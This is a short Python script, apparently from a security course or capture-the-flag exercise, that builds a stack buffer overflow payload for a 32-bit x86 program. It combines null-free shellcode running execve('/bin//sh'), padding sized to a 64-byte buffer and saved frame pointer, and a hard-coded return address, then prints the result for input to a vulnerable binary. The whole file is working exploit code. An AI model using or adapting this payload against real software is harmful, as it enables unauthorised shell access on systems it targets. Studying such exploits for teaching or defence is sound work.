# Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
SHELLCODE = (
    b"\x31\xc0"  # xor eax, eax
    + b"\x50"  # push eax (null terminator)
    + b"\x04\x0b"  # add al, 11 (execve)
    + b"\x68//sh"  # push "//sh"
    + b"\x68/bin"  # push "/bin"
    + b"\x89\xe3"  # mov ebx, esp (ebx points to "/bin//sh")
    + b"\x31\xc9"  # moc ecx, ecx (argv = NULL)
    + b"\x31\xd2"  # moc edx, edx (envp = NULL)
    + b"\xcd\x80"  # int 0x80 (syscall)
)

BUFFER_SIZE = 64
INT_SIZE = 4
ALIGNMENT_SIZE = 8
EBP_SIZE = 4
PADDING_SIZE = BUFFER_SIZE + INT_SIZE + ALIGNMENT_SIZE + EBP_SIZE - len(SHELLCODE)
PADDING = PADDING_SIZE * b"A"

STRDUP_ADDR = b"\x08\xa0\x04\x08"

print(SHELLCODE + PADDING + STRDUP_ADDR)
